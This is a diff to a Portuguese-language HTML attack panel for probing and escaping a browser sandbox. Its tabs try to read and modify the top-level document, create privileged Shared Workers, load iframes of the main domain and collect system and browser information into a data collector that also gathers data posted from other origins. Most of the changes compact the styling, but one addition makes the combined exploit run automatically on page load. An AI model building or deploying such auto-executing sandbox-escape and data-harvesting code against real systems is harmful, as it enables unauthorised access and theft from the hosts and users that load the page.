@@ -11,26 +11,35 @@
             margin: 0 auto;
             padding: 20px;
             background-color: #f0f0f0;
+            font-size: 12px; /* Reduzido para caber mais conteúdo */
         }
         h1, h2, h3 {
             color: #333;
+            font-size: 16px; /* Reduzido para caber mais conteúdo */
+            margin: 8px 0;
+        }
+        h1 {
+            font-size: 18px;
         }
         .container {
             background-color: white;
             border-radius: 8px;
-            padding: 20px;
+            padding: 10px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
         .result {
-            margin-top: 10px;
-            padding: 10px;
+            margin-top: 5px;
+            padding: 5px;
             border-radius: 4px;
-            min-height: 50px;
+            min-height: 30px;
+            max-height: 150px;
+            overflow-y: auto;
             background-color: #f9f9f9;
             border: 1px solid #ddd;
             white-space: pre-wrap;
             word-break: break-all;
+            font-size: 11px; /* Reduzido para caber mais conteúdo */
         }
         .success {
             color: #d32f2f;
@@ -40,12 +49,12 @@
             background-color: #d32f2f;
             color: white;
             border: none;
-            padding: 10px 15px;
+            padding: 5px 8px;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
-            margin-right: 10px;
+            font-size: 11px;
+            margin-top: 5px;
+            margin-right: 5px;
         }
         button:hover {
             background-color: #b71c1c;
@@ -54,24 +63,26 @@
             position: sticky;
             top: 0;
             background-color: #fff;
-            padding: 10px 0;
+            padding: 5px 0;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
             z-index: 100;
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+            align-items: center;
         }
         .refresh-button {
             background-color: #333;
         }
         textarea {
             width: 100%;
-            height: 100px;
-            margin-top: 10px;
-            padding: 8px;
+            height: 60px;
+            margin-top: 5px;
+            padding: 4px;
             border-radius: 4px;
             border: 1px solid #ddd;
             font-family: monospace;
+            font-size: 11px;
         }
         #data-collector {
             position: fixed;
@@ -80,36 +91,39 @@
             right: 0;
             background-color: #333;
             color: white;
-            padding: 10px;
+            padding: 5px;
             z-index: 1000;
-            max-height: 200px;
+            max-height: 150px;
             overflow-y: auto;
+            font-size: 11px;
         }
         #data-collector h3 {
             color: white;
             margin-top: 0;
+            font-size: 14px;
         }
         .data-item {
-            margin-bottom: 10px;
-            padding: 5px;
+            margin-bottom: 5px;
+            padding: 3px;
             border-bottom: 1px solid #555;
         }
         iframe {
             width: 100%;
-            height: 200px;
+            height: 100px;
             border: 1px solid #ddd;
-            margin-top: 10px;
+            margin-top: 5px;
         }
         .tabs {
             display: flex;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
         }
         .tab {
-            padding: 10px 15px;
+            padding: 5px 8px;
             background-color: #eee;
             cursor: pointer;
             border-radius: 4px 4px 0 0;
-            margin-right: 5px;
+            margin-right: 3px;
+            font-size: 11px;
         }
         .tab.active {
             background-color: #d32f2f;
@@ -121,6 +135,28 @@
         .tab-content.active {
             display: block;
         }
+        /* Estilo para a notificação de vulnerabilidade */
+        #exploit-notification {
+            background-color: red;
+            color: white;
+            padding: 10px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 9999;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        /* Layout em colunas para melhor aproveitamento do espaço */
+        .columns {
+            display: flex;
+            gap: 10px;
+        }
+        .column {
+            flex: 1;
+        }
     </style>
 </head>
 <body>
@@ -129,31 +165,31 @@
         <button class="refresh-button" onclick="location.reload()">Atualizar Página</button>
     </div>
 
-    <div class="container">
-        <h2>Painel de Controle</h2>
-        <p>Esta página explora mais profundamente as vulnerabilidades encontradas e tenta extrair informações do sistema.</p>
-        
-        <div class="tabs">
-            <div class="tab active" onclick="showTab('dom-tab')">DOM</div>
-            <div class="tab" onclick="showTab('worker-tab')">Workers</div>
-            <div class="tab" onclick="showTab('code-tab')">Código</div>
-            <div class="tab" onclick="showTab('network-tab')">Rede</div>
-        </div>
-        
-        <div id="dom-tab" class="tab-content active">
-            <h3>Exploração Avançada do DOM</h3>
-            <p>Tenta extrair e manipular informações do documento principal.</p>
-            <button onclick="extractDOMInfo()">Extrair Informações do DOM</button>
-            <button onclick="modifyDOM()">Tentar Modificar DOM Principal</button>
-            <div id="dom-result" class="result"></div>
-        </div>
-        
-        <div id="worker-tab" class="tab-content">
-            <h3>Exploração Avançada de Shared Workers</h3>
-            <p>Tenta criar um Shared Worker para executar código privilegiado e acessar recursos do sistema.</p>
-            <button onclick="createAdvancedSharedWorker()">Criar Shared Worker Avançado</button>
-            <button onclick="executeCodeInWorker()">Executar Código no Worker</button>
-            <textarea id="worker-code">// Código a ser executado no worker
+    <div class="columns">
+        <div class="column">
+            <div class="container">
+                <h2>Painel de Controle</h2>
+                <p>Esta página explora vulnerabilidades e extrai informações do sistema.</p>
+                
+                <div class="tabs">
+                    <div class="tab active" onclick="showTab('dom-tab')">DOM</div>
+                    <div class="tab" onclick="showTab('worker-tab')">Workers</div>
+                    <div class="tab" onclick="showTab('code-tab')">Código</div>
+                    <div class="tab" onclick="showTab('network-tab')">Rede</div>
+                </div>
+                
+                <div id="dom-tab" class="tab-content active">
+                    <h3>Exploração Avançada do DOM</h3>
+                    <button onclick="extractDOMInfo()">Extrair Informações do DOM</button>
+                    <button onclick="modifyDOM()">Tentar Modificar DOM Principal</button>
+                    <div id="dom-result" class="result"></div>
+                </div>
+                
+                <div id="worker-tab" class="tab-content">
+                    <h3>Exploração Avançada de Shared Workers</h3>
+                    <button onclick="createAdvancedSharedWorker()">Criar Shared Worker Avançado</button>
+                    <button onclick="executeCodeInWorker()">Executar Código no Worker</button>
+                    <textarea id="worker-code">// Código a ser executado no worker
 try {
   // Tenta acessar o sistema de arquivos
   const result = self.location.toString();
@@ -164,13 +200,12 @@ try {
 } catch(e) {
   return 'Erro: ' + e.message;
 }</textarea>
-            <div id="worker-result" class="result"></div>
-        </div>
-        
-        <div id="code-tab" class="tab-content">
-            <h3>Execução de Código Avançado</h3>
-            <p>Tenta executar código JavaScript para acessar recursos privilegiados.</p>
-            <textarea id="custom-code">// Tenta acessar o domínio principal
+                    <div id="worker-result" class="result"></div>
+                </div>
+                
+                <div id="code-tab" class="tab-content">
+                    <h3>Execução de Código Avançado</h3>
+                    <textarea id="custom-code">// Tenta acessar o domínio principal
 try {
   const domain = window.top.document.domain;
   console.log('Domínio principal:', domain);
@@ -198,33 +233,39 @@ try {
   console.log('Erro:', e.message);
   return 'Erro: ' + e.message;
 }</textarea>
-            <button onclick="executeAdvancedCode()">Executar Código</button>
-            <div id="code-result" class="result"></div>
+                    <button onclick="executeAdvancedCode()">Executar Código</button>
+                    <div id="code-result" class="result"></div>
+                </div>
+                
+                <div id="network-tab" class="tab-content">
+                    <h3>Exploração de Rede</h3>
+                    <button onclick="testLocalAccess()">Testar Acesso Local</button>
+                    <button onclick="createIframeToMainDomain()">Criar Iframe para Domínio Principal</button>
+                    <div id="iframe-container"></div>
+                    <div id="network-result" class="result"></div>
+                </div>
+            </div>
         </div>
         
-        <div id="network-tab" class="tab-content">
-            <h3>Exploração de Rede</h3>
-            <p>Tenta acessar recursos de rede locais e externos.</p>
-            <button onclick="testLocalAccess()">Testar Acesso Local</button>
-            <button onclick="createIframeToMainDomain()">Criar Iframe para Domínio Principal</button>
-            <div id="iframe-container"></div>
-            <div id="network-result" class="result"></div>
+        <div class="column">
+            <div class="container">
+                <h2>Extração de Informações do Sistema</h2>
+                <button onclick="extractSystemInfo()">Extrair Informações do Sistema</button>
+                <button onclick="extractBrowserInfo()">Extrair Informações do Navegador</button>
+                <div id="system-result" class="result"></div>
+            </div>
+            
+            <div class="container">
+                <h2>Exploração Combinada</h2>
+                <button onclick="runCombinedExploit()">Executar Exploração Combinada</button>
+                <div id="combined-result" class="result"></div>
+            </div>
+            
+            <div class="container">
+                <h2>Dados Coletados</h2>
+                <div id="collected-data-inline" class="result"></div>
+            </div>
         </div>
-    </div>
-    
-    <div class="container">
-        <h2>Extração de Informações do Sistema</h2>
-        <p>Tenta extrair informações detalhadas do sistema operacional e navegador.</p>
-        <button onclick="extractSystemInfo()">Extrair Informações do Sistema</button>
-        <button onclick="extractBrowserInfo()">Extrair Informações do Navegador</button>
-        <div id="system-result" class="result"></div>
-    </div>
-    
-    <div class="container">
-        <h2>Exploração Combinada</h2>
-        <p>Combina múltiplas técnicas para tentar escapar da sandbox.</p>
-        <button onclick="runCombinedExploit()">Executar Exploração Combinada</button>
-        <div id="combined-result" class="result"></div>
     </div>
     
     <div id="data-collector">
@@ -286,13 +327,21 @@ try {
         // Função para atualizar o coletor de dados
         function updateDataCollector() {
             const dataCollector = document.getElementById('collected-data');
+            const dataCollectorInline = document.getElementById('collected-data-inline');
             dataCollector.innerHTML = '';
+            dataCollectorInline.innerHTML = '';
             
             collectedData.forEach(item => {
                 const dataElement = document.createElement('div');
                 dataElement.className = 'data-item';
                 dataElement.innerHTML = `<strong>[${item.timestamp} - ${item.source}]</strong><br>${item.data}`;
                 dataCollector.appendChild(dataElement);
+                
+                // Também adiciona ao coletor de dados inline
+                const dataElementInline = document.createElement('div');
+                dataElementInline.className = 'data-item';
+                dataElementInline.innerHTML = `<strong>[${item.timestamp} - ${item.source}]</strong><br>${item.data}`;
+                dataCollectorInline.appendChild(dataElementInline);
             });
         }
         
@@ -907,7 +956,7 @@ try {
                         exploitDiv.textContent = 'VULNERABILIDADE EXPLORADA COM SUCESSO!';
                         exploitDiv.style.backgroundColor = 'red';
                         exploitDiv.style.color = 'white';
-                        exploitDiv.style.padding = '20px';
+                        exploitDiv.style.padding = '10px';
                         exploitDiv.style.position = 'fixed';
                         exploitDiv.style.top = '0';
                         exploitDiv.style.left = '0';
@@ -915,7 +964,7 @@ try {
                         exploitDiv.style.zIndex = '9999';
                         exploitDiv.style.textAlign = 'center';
                         exploitDiv.style.fontWeight = 'bold';
-                        exploitDiv.style.fontSize = '24px';
+                        exploitDiv.style.fontSize = '16px';
                         
                         topDoc.body.appendChild(exploitDiv);
                         results.push('DOM principal modificado com sucesso!');
@@ -999,6 +1048,11 @@ try {
             if (event.data && event.data.type === 'exploitData') {
                 addCollectedData('external', `Dados recebidos de ${event.origin}: ${JSON.stringify(event.data.data)}`);
             }
+        });
+        
+        // Executa a exploração combinada automaticamente ao carregar a página
+        window.addEventListener('load', function() {
+            setTimeout(runCombinedExploit, 500);
         });
     </script>
 </body>
